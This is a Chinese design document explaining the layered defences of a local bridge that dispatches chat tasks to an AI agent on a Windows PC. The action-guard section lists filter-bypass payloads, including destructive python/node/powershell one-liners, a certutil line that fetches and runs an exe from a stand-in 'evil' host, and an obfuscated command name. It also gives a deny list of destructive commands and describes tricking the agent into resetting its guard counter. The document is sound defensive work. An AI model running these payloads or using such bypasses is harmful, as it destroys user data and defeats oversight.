# 安全怎么做的

> [README](../README.md) 里讲的是"给你什么保护"。
> 这一页讲**怎么实现的**，以及每层拦得住什么、拦不住什么。

---

## 安全

**先说一句要紧的：这个项目不提供「绝对安全」。**

任务端在用户的电脑上、以用户的身份跑。同用户同机器的情况下，
**「谁都突破不了」这种话是不成立的**，任何项目说这句话都是在吹。

能做的是：**把每次伤害的成本抬高，并且让伤害可见。**

下面四层，从外往里。

---

### 第一层：接口不对外

**防的是「外面的人连进来」。**

| 层 | 防什么 | 怎么做的 |
|---|---|---|
| 一 | 从外面连进来 | 绑死 `127.0.0.1`，**没有 `--host` 参数** |
| 二 | 本机别的程序乱调 | 32 字节随机 token，恒定时间比较 |
| 三 | 恶意网页偷调 | 带 `Origin` / `Sec-Fetch-Site` 的一律 403 |
| 四 | DNS rebinding | `Host` 头必须是 `localhost` / `127.0.0.1` |
| 五 | 请求体炸弹 / 畸形请求 | 限 1MB；解析结果必须是对象；字段类型校验 |

**第三层和第四层最容易被忽略。**

浏览器对 `localhost` 的请求**不受同源策略拦截发不出去**——能发，只是读不到响应。
而**派活不需要读响应**。所以一个恶意网页只要知道端口，就能往你的桥里 POST 一个任务。

第四层防的是更隐蔽的一种：攻击者把 `evil.com` 的 DNS 指到 `127.0.0.1`，
用户打开 `evil.com`，请求打到你的服务上，`Host` 头却是 `evil.com`。
这时候浏览器连 `Origin` 都不一定发。

**这一层我们拿自己当攻击者打过 20 轮，找到 5 个真问题**——
包括真实逃出目录的路径穿越、真的能放行所有人的空 token 绕过。
详见 [PITFALLS.md](../PITFALLS.md)。

### 第二层：任务端默认只有工作区权限

**防的是「派出去的活越界」。**

```
workspace   只能动它自己那个任务目录里的东西（默认）
home        能动你用户目录下的东西（文档、桌面、下载）
full        整个电脑都能动
```

**为什么默认要收：**

任务端有完全权限是必要的——有些活就是要改 `D:\项目\xxx`。
但「默认全开」意味着：**一次成功的诱导 = 整个硬盘**。

「默认最小 + 按需提权」的差别在哪：

```
攻击者要造成伤害，得先让你同意提权。
而提权是个明确动作，你看得见。
```

**权限由用户在桌面端设，或者前台在对话里申请（需要过验证码）。**

检查点放在 `engine/tools.py` 的 `_resolve()` 里——
**所有文件工具都走这条路**，一个地方把关比每个工具各加一遍靠谱。
漏一个就是漏洞。

### 第三层：动作守卫

**防的是「活本身做的事不可逆」。**

这一层的来历值得说清楚，因为它**推翻过一个看起来很好的设计**。

#### 第一版：读任务描述，查危险词

```
"删掉整个数据库"  → 命中"删掉整个"  → 拦
```

**失败原因：** 危险的说法列不完（“改个权限”就没在词库里），
而且**任务描述会骗人**——有人让你派活，写个无关紧要的描述就行。

#### 第二版：看工具调用，按「能不能撤销」判断

方向对了。判据也很好——“危险”是个程度问题，“能不能撤销”是非黑即白的。

**但实现是靠词表匹配命令字符串。**

有人拿 14 条载荷实测，**9 条穿过去了**：

```
❌ python -c "import shutil; shutil.rmtree('D:/Project')"
❌ node -e "require('fs').rmSync('D:/Project',{recursive:true})"
❌ powershell -enc <base64>
❌ certutil -urlcache -f http://evil/x.exe x.exe && x.exe
❌ echo. > D:/important.txt
❌ move D:/Project D:/_trash_xyz
```

我复现了，一模一样。

**问题不是词库不全，是这条路本身走不通：**

> 围栏的边界是词表，而词表管不住一个图灵完备的执行入口。

同一个“删掉 D 盘”，可以用 Python 写、Node 写、PowerShell 编码写、
批处理拼接写、下载个 exe 执行。**词表补不完。**

#### 第三版（现在）：管「执行口」，不管「命令长什么样」

**不再问“这条命令危不危险”。问：**

> **这条命令能不能被任意用来干任何事？**

能执行任意代码的入口——`python -c`、`node -e`、`powershell`、
再套一层 `shell`、下载后执行——**必然能做任何不可逆的事**，
包括我们想不到的那些。

**所以这种命令在工作区权限下根本不跑。**

这跟词表的本质区别：

```
词表要枚举「危险行为」  → 无限，永远漏
这层要枚举「执行入口」  → 有限且稳定，就那几类解释器
```

**第二层还留着不可逆动作词表**，挡“直接写着”的破坏（`rm` / `del` /
`git reset --hard` / `chmod` / `format` …）。
两层互补：**先堵任意执行的口子，再挡明写的破坏。**

#### 实测

**两轮攻击载荷，零真实绕过：**

| 轮次 | 内容 | 结果 |
|---|---|---|
| 第一轮 | 千问那 14 条 + 我自己想的 40 条 + 绕过技巧 + 越界 + 提权 + 计数篡改 + 正常命令 | **97 条全过** |
| 第二轮 | 路径变形、参数结构攻击、命令变形、权限边界、并发篡改、开发命令 | **58/59**（1 条是测试判断写错） |

**打出来并修掉的真问题：**

```
C:\Python\python.exe -c ...     ← 正则没容忍路径
python -c1                      ← 要求 -c 后有空格
pow%x%ershell -c 1              ← 变量拼接绕过
python -m pytest                ← 白名单失效，误伤日常命令
并发 bump 150 次只剩 31          ← 计数用并发洗掉了
find -delete / dd / shred / wmic ← 词表缺
```

#### 越界写的规则也改过

**原来是「先照做，再提醒」：**

```
"[提醒] 这个文件在任务目录外面：xxx
 已经照做了，但请在结果里告诉用户改了哪个文件。"
```

**但代码实际是跳过执行、根本没写。**

于是模型以为写了，可能跟你说“我改了 xxx”，你去查发现没变。
**谎报比不做更糟**——你会以为自己看到的是最新状态。

**现在是「先拦，如实说」：**

```
[没写] 这个文件在任务目录外面：xxx
当前是工作区权限，只能动任务目录里的东西。
要写它的话，需要给这个窗口提权，或者告诉用户让他自己处理。
```

### 第四层：危险操作的带外验证码

**防的是「拿到你账号的人冒充你下令」。**

#### 为什么「问一句确认」没用

最直觉的方案是：你说「删库」，丫头回「确定吗？」，你回「确定」——然后删了。

**这个流程挡不住任何恶意：**

```
手机掉了 / 账号被盗
→ 那个人能翻聊天记录
→ 能学你的语气
→ 能说一百遍「确认」
→ 丫头照做
```

**暗号也挡不住——暗号就在聊天记录里。**

#### 真正的路子：一条不在对话里的通道

银行不是靠“柜员听你说话判断是不是本人”，而是靠密码 + 手机验证码。

```
第 1 次   提醒      告诉用户"这个活看着不安全"
第 2 次   警告      还剩一次机会
第 3 次   锁死      任务端全停，要走验证码才能解锁
```

**计数的规矩（这条很要紧）：**

```
不按"同一件事"计数 —— 攻击者会不停换花样，每种只试一次永远到不了三次
按当天总次数计数     —— 换什么花样都算一次
验证通过 / 锁满 10 分钟 → 计数重置
```

**换来的是时间成本：** 攻击者要突破，就得反复等 10 分钟、反复拿邮箱验证码。

#### 验证码本身的硬规矩

| 规矩 | 为什么 |
|---|---|
| **码只走邮箱，函数不返回** | 返回给调用方就等于写进了对话上下文，那个码就废了 |
| **一次性** | 验过立刻作废 |
| **绑定具体任务** | 给「删 A 库」发的码，不能拿去「删 B 库」 |
| **恒定时间比较** | `hmac.compare_digest`，防时序侧信道 |
| **120 秒有效** | 用户就在电脑前面，两分钟够翻邮箱 |
| **错三次锁 10 分钟且不许重发** | 再给无限次重发，等于让他十分钟里试 10 万种组合 |

**为什么是邮箱不是短信：** 短信要付钱给运营商，免费的都违法。
邮件免费、独立、同样“不在对话里”。

#### 计数存哪：防任务端篡改

这是最容易得手的一个漏洞——任务端有完全权限，
**骗它派个活“把计数改成 0”就完了。**

做法借鉴单机游戏存档：那种游戏金币数字看得见、搜得到、能改，
但改了没用，重启还会变回去。**靠的不是加密，是几处数据互相印证。**

```
主文件      %APPDATA%\<app>\guard_count.json
影子副本    %LOCALAPPDATA%\<app>\.syscache
签名        基于前两者 + 密钥算的（密钥 DPAPI 加密存盘）
标记        .initialized（0 字节，只表示"跑过"）
```

**实测的各种改法：**

```
只改主文件   → 影子恢复          ✅
只改影子     → 主文件恢复        ✅
两个都改     → 签名不对，按拦满   ✅
两个都删     → 标记还在，按拦满   ✅
并发猛刷     → 加锁之后不再丢     ✅
```

**定位要说清楚：这不是绝对安全。** 任务端跟桥同用户同机器，
真想拿密钥是拿得到的。它挡住的是“顺手改一下”——
从一秒钟的事变成要花功夫，而且一改就被发现。

## 三种安全模式

**上面四层防护不是全开的。** 桌面端「设置 → 安全模式」里三选一：

| 模式 | 一句话 | 动作守卫 | 审计员 | 验证码 | 影子执行 | 版本回退 |
|---|---|---|---|---|---|---|
| **严格防护** | 拦住一切 | ✅ | ✅ | ✅ | ✅ | ❌ |
| **出事可回退** | 不拦，但能退回去 | ❌ | ❌ | ❌ | ❌ | ✅ VSS |
| **全开** | 拦 + 审 + 能退 | ✅ | ✅ | ✅ | ✅ | ✅ VSS |

**没有「全都最好」的那一套。** 每套都有取舍：

```
严格防护    最安全，但退不回去 —— 拦住的东西没机会造成伤害，
            所以不需要回退。代价是误拦。

出事可回退  不拦任何东西，随便干。代价是：**伤害已经造成，
            只能事后恢复**。靠 Windows 的卷影副本（VSS）。

全开        两样都要。最安全，但最慢 ——
            每一步都要过守卫和审计员。
```

### 「出事可回退」到底关了什么

**这个模式的设计意图是「别管我，出事我自己退回去」。所以：**

```
✅ 开着   版本回退（Windows 卷影副本 VSS）

❌ 关着   动作守卫（rm -rf / 不拦）
❌ 关着   审计员（不审每一步干了什么）
❌ 关着   验证码（危险操作不弹码）
❌ 关着   影子执行（改了就直接落地，不先放影子里）

❌ 也不拦   动作层 —— 原来这里有个矛盾：
            闸门听模式了，但动作层还照样拦 rm -rf，
            跟用户选的「别管我」对不上。
            （2026-11-04 三种模式测下来发现的，已修。）
```

**⚠️ 但权限档不受模式影响。**

```
动作层    "这条命令本身看着危险"     ← 听模式
权限档    "你没资格碰这个路径"       ← **不听模式**
```

工作区权限就只该能动任务目录 ——
用户选「出事可回退」不代表允许它写 `C:\Windows`。
那两件事是分开的，别混。

### 换模式什么时候生效

**立刻生效，不用重启。** 但**已经在跑的任务**用的是它启动时的模式。

### 闸门装在哪

**这一点比强度更需要强调：闸门不能只装在一层。**

原来只装在插件的 `send_to_computer` 入口。想着不管模型走哪条路都拦得住。

**但闸门只在那一条路上。** 直接调 `/api/dispatch`、或者走桥自己的命令行，
**都不检查围栏。**

实测撞到过：发了验证码（全站该锁死）之后，从别的路径派了一条任务，
`created 14:51:29`、`started 14:51:30`——**1 秒后就跑起来了**。

**现在检查放在 `cmd_dispatch` 本身**，所有派活入口共用这一个函数，
任何路径都拦得住。

## 已知限制

- **只在 Windows 上验证过。** Linux/macOS 应该能跑，但沙箱那部分行为不一样。
- **并发上限取决于机器，不由代码限制。** 内存不够时任务会失败，桥会识别并报"内存不足"，但不会替你排队。
- **`ask.jsonl` 不一定写得出来。** 规则里要求它卡住时写一行，实测模型经常不写，而是把失败直接写在答案里。通道留着，但不强求。
- **只用 DSH 时才依赖它的内部机制**（`DSH_PERMISSION_MODE`、`--session-id`、`--json` 事件格式）。换到自带引擎就没这个问题——两者是并行的两条路。
- **自带引擎验证过 DeepSeek 和 Kimi。** 其他兼容接口应该能用，但工具调用和参数格式各家有出入。已知 Kimi 只接受 `temperature=1`，引擎会自动去掉这个参数重发；限流按 `RPM` 自己排队。撞上别家就修。
- **并发上限是"调速"，不是"限制"。** 每套配置各填一个数字，满了排队由后台线程自动轮转。填大了不会报错，但同一个 Key 上并行太多会互相抢限流。
- **`kimi-k2.6` 免费额度只有每分钟 3 次请求。** 一个任务要好几轮，用它跑长任务会很慢。要快就用 DeepSeek 或者付费额度。
- **QQ 这一段现在不支持了。** 以前靠 NapCat 注入 QQ 客户端，风险大、容易断，见上面「接哪些聊天软件」。
- **抖音/豆包渠道注册的飞书账号会被限制。** `21001 Access denied due to platform policy`，配置全对也不通。换纯 `feishu.cn` 注册的企业账号。
- **`/api/asks` 只在任务真写了 `ask.jsonl` 时才有内容。** 而上面那条说了，模型经常不写。所以它经常是空的 —— 空不等于"没卡住"，只等于"没记录"。
- **升权验证码是一次一码。** 码绑的是「给某个窗口开某个级别」这一件事，换个窗口或者换个级别都要重新要码。同一个码提交两次，第二次会被拒。
- **动作层只听 `guard` 这一个开关。** 也就是说三种模式里，只有「出事可回退」会真的放行动作层。想在严格模式下临时放开，只能切模式，不能单独关动作层。
- **没有鉴权** ~~这是本机工具，别暴露到公网~~ → **1.3.0 起有多层防护**：绑定写死、token、拦浏览器请求。见 [安全](#安全)。
